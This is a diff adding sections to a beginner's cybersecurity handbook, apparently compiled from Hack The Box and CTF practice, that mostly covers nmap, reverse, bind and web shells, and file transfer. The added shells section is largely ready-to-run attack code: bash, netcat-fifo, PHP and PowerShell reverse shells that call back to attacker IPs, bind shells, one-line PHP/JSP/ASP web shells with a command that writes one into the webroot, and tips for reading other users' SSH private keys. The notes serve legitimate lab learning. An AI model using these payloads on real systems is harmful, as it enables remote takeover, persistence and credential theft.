@@ -1,10 +1,10 @@
-# **Welcome**
+# **WELCOME**
 
 Welcome to a CyberSecurity Beginner Handbook 📒: the Cybersecurity Starter's Treasure Trove!
 
 Dive into a curated collection of knowledge, gleaned from learning platforms, CTF challenges, and personal exploration.
 
-# **Walkthrough**
+# **WALKTHROUGH**
 
 Google is your friend! GOOGLE EVERYTHING! Even if it seems stupid... just Google it
 
@@ -51,7 +51,7 @@ Now let's attempt to discover and list the files and directories within a web se
 
 # **NMAP**
 
-## **what is it for?**
+## **what is it**
 
 - Audit the security aspects of networks
 - Simulate penetration tests
@@ -124,7 +124,7 @@ Here an example of converting nmap out into an HTML page:
 ***Example: `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5`***
 ***generate random (`RND`) a specific number (for example: `5`) of IP addresses separated by a colon (`:`). Our real IP address is then randomly placed between the generated IP addresses***
 
-**`-sU`** UDP scan. Can be combined to a TCP scan type like SYN (-sS)
+**`-sU`** UDP scan. Can be combined to a TCP scan type like SYN (-sS), like so: **`-sSU`**
 
 **`-sY`** **SCTP INIT** scan. SCTP INIT scan is the SCTP equivalent of a TCP SYN scan.
 
@@ -282,6 +282,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 
 **`vuln`**  find out vulnerabilities (THIS IS A SCRIPT CATEGORY) - more info here https://nmap.org/book/host-discovery-strategies.html
 
+**`dns-nsid`** REtrieves information from a DNS server by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values
 
 
 ## Port Statuses
@@ -799,3 +800,457 @@ what are you searching for? could be
 - It s good to set **RHOSTS** and **RPORT** but it VERY IMPORTANT to also double check the other params that may have already been set.
 
 For ex in HTB web exploit chall, the exploit had FILEPATH as default /**etc/passords** but the file you wanted was actually at **/flag.txt** (As specified in the excercie description) so again pay attention frien 🙂
+
+# **SHELLS**
+
+## what is it:
+
+A reverse shell allows you to access a compromised host for control and remote code execution
+
+💡 ***it s like maintaining an opening so you can continue to exploit through there***
+
+**type of  Shell:**
+
+| Shell | Description |
+| --- | --- |
+| Reverse Shell | Connects back to our system and gives us control through a reverse connection. |
+| Bind Shell | Waits for us to connect to it and gives us control once we do. |
+| Web Shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |
+
+## Reverse Shell
+
+**pros**
+
+- most common
+
+- quickest & easiest
+
+- **once vuln is found that allow remote code exec, start netcat listener on our machine**
+
+**cons**
+
+- fragile connection
+
+- Lose cnnection of shell command is stopped or lose connection.
+
+- will have to use initial exploit to execute rever shell again
+
+
+
+**Implementation steps:**
+
+**1 - start nc listener on port of your choosing:**
+
+For this we use `nc`
+
+```
+Eli90@htb[/htb]$ nc -lvnp 1234
+listening on [any] 1234 ...
+```
+
+| Flag | Description |
+| --- | --- |
+| -l | Listen mode, to wait for a connection to connect to us. |
+| -v | Verbose mode, so that we know when we receive a connection. |
+| -n | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |
+| -p 1234 | Port number netcat is listening on, and the reverse connection should be sent to. |
+
+**2 - Listener is set up (above) - Connect back to it.**
+
+- Find your IP address (`ifconfig` look for ip under network interface up and running, either ‘eth’ or ‘wl…’)
+
+- Execute reverse shell commands:
+
+Depending on target OS (windows or kinux), executable commands will differ. See [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for comprehensive list of reverse comands.
+
+**Option 1:**
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+
+```
+
+This command appears to be a Bash one-liner that creates a reverse shell connection to a specified IP address and port. Let me break it down for you:
+
+1. `bash -c`: This is used to execute the following command in a new Bash shell.
+2. `'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`: This is the command being executed within the new shell. Let's break it down further:
+    - `bash -i`: This runs Bash in interactive mode, allowing for user input.
+    - `>& /dev/tcp/10.10.10.10/1234`: This part sets up a redirection of both standard output (stdout) and standard error (stderr) to a TCP connection. `/dev/tcp` is a special filesystem in Unix-like systems that allows you to create connections using special files.
+    - `0>&1`: This part redirects standard input (stdin) to the same TCP connection. It ensures that the input from the remote host (where the reverse shell is established) is redirected to the command being executed.
+
+When this command is executed, it effectively creates a reverse shell connection to the IP address `10.10.10.10` on port `1234`. This means that if a listener is set up on the specified IP and port, the remote machine will establish a shell session back to that listener, effectively allowing remote control over the target machine.
+
+**Option 2:**
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 9443 >/tmp/f
+
+```
+
+is another example of a shell command that establishes a reverse shell connection to a specified IP address and port. Let's break down the command step by step:
+
+1. `rm /tmp/f`: This command attempts to remove a file named "f" in the "/tmp" directory. This is done to ensure that the subsequent command does not fail due to the file already existing.
+2. `mkfifo /tmp/f`: This creates a named pipe (FIFO) named "f" in the "/tmp" directory. Named pipes are used to establish communication between processes.
+3. `cat /tmp/f|/bin/sh -i 2>&1`: This part of the command sets up a pipeline. It reads the content from the named pipe "f" and sends it to the standard input of the `/bin/sh` shell with the `i` flag (interactive mode). The `2>&1` redirects the standard error (file descriptor 2) to the same location as standard output (file descriptor 1), ensuring that any error messages are included in the communication.
+4. `nc 10.10.10.10 1234 >/tmp/f`: This part uses the `nc` command (netcat) to establish a connection to the IP address `10.10.10.10` on port `1234`. The output of the shell process started in the previous step is redirected to the named pipe "f" in the "/tmp" directory.
+
+💡 ***In essence, both commands above aim to achieve the same goal: establishing a reverse shell connection to a remote host. The second command is more complex and involves the use of named pipes and the*** ***`cat` command for communication between the shell process and the `nc` process. The choice of which command to use might depend on the specific context, the tools available on the target system and the preferences of the person executing the command.***
+
+
+**IMPORTANT ❗️**
+
+---
+
+It is important to adapt the reverse shell code to the language you are dealing with. For ex the nibble machine in HTB we were dealing with PHP and so we leveraged **payloadallThings** or others to find the correct format for the reverse shell. as such the command below becomes:
+
+`<? php system (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 1234 >/tmp/f"); ?>`
+
+---
+
+Code: powershell
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+```
+
+
+Once connection is established, we should get the following:
+
+```
+Eli90@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+💡 ***NOTICE IN REVERSE SHELL, WE USE TARGET **PORT**  WITH **ATTACKER’S IP*****
+
+
+## Bind Shell
+
+A bind shell will listen on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port.
+
+**pros**
+
+- if connection is lost, we can connect back to it and get another connection
+
+**cons**
+
+- if bind shell command is stopped access will be lost
+
+- if host is rebooted, access will be lost
+
+**difference with reverse shell**
+
+💡 From what I have noticed, the main diff is see how on a reverse shell you have to find your IP address and specify it when setting up a listener with nc on port 1234, you conect back to it and specify your own IP address
+
+
+**STEPS TO IMPLEMENT:**
+
+**1 - start a bind shell**
+
+Code: bash
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+
+```
+
+Code: python
+
+```python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+```
+
+Code: powershell
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+```
+
+
+💡 ***NOTE: typically, IP address is set to 0.0.0.0 so that we can connect to it from anywhere*** ***Note that form the commands above, only the python script has the IP 0.0.0.0 specified. So I am assuming the others dont need it?***
+
+❗️ **IP 0.0.0.0** has a special meaning in networking:
+
+0.0.0.0 is referred to as an "unspecified" or "wildcard" address. It does not specifically represent a single device on a network but is used in different contexts:
+
+1. **Listening on All Network Interfaces**: When a network service or application binds to the IP address "0.0.0.0," it is indicating that it is willing to listen for incoming connections on all available network interfaces or IP addresses on the system. In this case, the service is not tied to any specific IP address.
+2. **Routing and Default Route**: In some networking contexts, "0.0.0.0" can represent the default route, which is used by routers to indicate that they should route packets to the best matching destination based on other routing table entries.
+3. **Configuration**: In network configuration, "0.0.0.0" might be used as a placeholder or wildcard value, indicating that the configuration applies to all available IP addresses or interfaces.
+4. **Subnetting**: In the context of subnetting, using "0.0.0.0" for the subnet mask indicates the entire IP address space, not a specific subnet.
+
+**2 - Connect to the port where we set up the shell to wait for us:**
+
+```
+Eli90@htb[/htb]$ nc 10.10.10.1 1234id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+And we are dropped into a bash session automatically.
+
+## TTY (Upgrading terminal)
+
+In order to be able to move cursor, use arrows and such.  There are multiple ways to do this, among which:
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
+
+`www-data@remotehost$ ^ZEli90@htb[/htb]$ stty raw -echoEli90@htb[/htb]$ fg[Enter]
+[Enter]
+www-data@remotehost$`
+
+Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset`
+ and hit enter to bring it back. At this point, we would have a fully
+working TTY shell with command history and everything else.
+
+more options [here](https://academy.hackthebox.com/module/77/section/725)
+
+## Web Shell
+
+A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
+
+**pros**
+
+- bypasses firewall restriction in place
+
+- will not open a new connection on port but run on web (80, 880 or 443, or wtv)
+
+- If rebooted, connection will still persists
+
+**cons**
+
+- shell obtained is not as interactive as we have to request a new url for  each command (although can be automated with a python script)
+
+**STEPS TO IMPLEMENT**
+
+**1 - Write a web shell**
+
+Code: php
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+Code: jsp
+
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+```
+
+Code: asp
+
+```
+<% eval request("cmd") %>
+
+```
+
+**2 - Upload the web Shell**
+
+Once we have our web shell, we need to place our web shell script into
+the remote **host's web directory (webroot)** to execute the script through
+the web browser. This can be through a vulnerability in an upload
+feature, which would allow us to write one of our shells to a file, i.e.
+ `shell.php` and upload it, and then access our uploaded file to execute commands.
+
+However if we dont have an upload feature and only access is through an exploit, we can write the shell directly to the webroot. as such:
+
+**(for apache server)**
+
+`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
+
+The following are the default webroots for common web servers:
+
+| Web Server | Default Webroot |
+| --- | --- |
+| Apache | /var/www/html/ |
+| Nginx | /usr/local/nginx/html/ |
+| IIS | c:\inetpub\wwwroot\ |
+| XAMPP | C:\xampp\htdocs\ |
+
+**3 - accessing it**
+
+Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
+
+in the browser address, type ⇒ *http://SERVER_IP:PORT/shell.php?cmd=**id***
+
+OR use **cURL**
+
+```
+curl http://SERVER_IP:PORT/shell.php?cmd=**id**
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+# **USEFUL LINKS**
+
+- Link dump
+
+[Hacktricks](https://book.hacktricks.xyz)
+
+[Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+- Enumeration Scripts:
+
+**Linux**
+
+[LinEnum](https://github.com/rebootuser/LinEnum.git)
+
+[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
+
+**Windows**
+
+[Seatbelt](https://github.com/GhostPack/Seatbelt)
+
+[JAWS](https://github.com/411Hall/JAWS)
+
+- Server Enumeration
+
+[PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+
+Note that these scripts are noisy and might trigger antivirus
+
+- Reach root with sudo:
+
+Linux  [GTFOBins](https://gtfobins.github.io/)
+
+Windowns [LOLBAS](https://lolbas-project.github.io/#)
+
+# QUICK LINUX CHEATSHEET
+
+`dpkg -l`    see what software is instaled on system
+
+`sudo ip link set <interface-name> down` switch a network interface down (ETH OR OTHER)
+
+`sudo -l`  Check which privileges we have
+
+`sudo su -`  switch user to **root**
+
+`sudo su <user name>`  switch to another user
+
+`chmod 600 <file>`  change the file's permissions to be more restrictive
+
+`ls -l file.txt`  Read permissions on a file
+
+APPEND TO A FILE
+
+`echo "new content" >> filename`
+
+OR
+
+`echo "new content" | tee -a filename`
+
+# **SSH**
+
+## What is it:
+
+Which stands for **Secure Shell**
+
+💡  ***Check if you have read access to /root/.ssh folder (or any other user /<user name>/.shh)***
+
+
+**If you have read permission** to the root folder, (check using command `ls -l <file-name>`) then read their  hidden  ********.ssh******** folder and read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
+
+# TRANSFERING FILES
+
+**Transfer files TO and FROM a remote**
+
+FIRST! Run a Python HTTP server where the file is living from (HOST if you are sending a file to remote / REMOTE if you are grabbing a file from remote…)
+
+`python3 -m http.server 8000`  is the standard command to start a server.
+
+Example of output:
+
+```
+**Eli90@htb[/htb]$** cd /tmp
+**Eli90@htb[/htb]$** python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+In the example above we have started a server at 0.0.0.0 (whch remember  0.0.0.0 is referred to as an "unspecified" or "wildcard" address.)
+
+and then on the remote we can download a file like so:
+
+## Wget
+
+`wget http://<your-IP-address (ATTACKER>:8000/linenum.sh`
+
+## cUrl
+
+`curl http://<HOST-IP>/linenum.sh -o linenum.sh`
+
+***Note that we used the `-o` flag to specify the output file name.***
+
+## SCP
+
+💡 ***you can only use this if you have obtained ssh user credentials on the remote host***
+
+`scp linenum.sh user@remotehost:/tmp/linenum.sh`
+
+***Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.***
+
+## Base64
+
+**In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine**
+
+In this case, the solution is to (1) ************************base64************************ encode the file in the attacker file —> (2) copy the encoded contain —> (3) paste and decode it in the remote
+
+commands:
+
+- (1)   `base64 shell -w 0`
+
+```
+**Eli90@htb[/htb]$** base64 shell -w 0
+
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+```
+
+- (2) … pretty self explanatory right?
+
+- (3) `echo <paste encoded contain here> | base64 -d > shell`
+
+`**user@remotehost$** echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
+
+**Validate file integrity after transfer!**
+
+- Check the file type is still the same
+
+With the `file`  command:
+
+```
+**user@remotehost$** file shell
+
+shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+```
+
+- Check its md5 hash is the same on both remote and host:
+
+With `md5sum` command:
+
+```
+**Eli90@htb[/htb]$** md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+# **CeWL**
+
+## What is it:
+
+(Pronounced COOL)
+
+Custom Word List generator.
+
+CeWL is a ruby app which spiders a given URL to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.
+
+See [Github repo](https://github.com/digininja/CeWL)
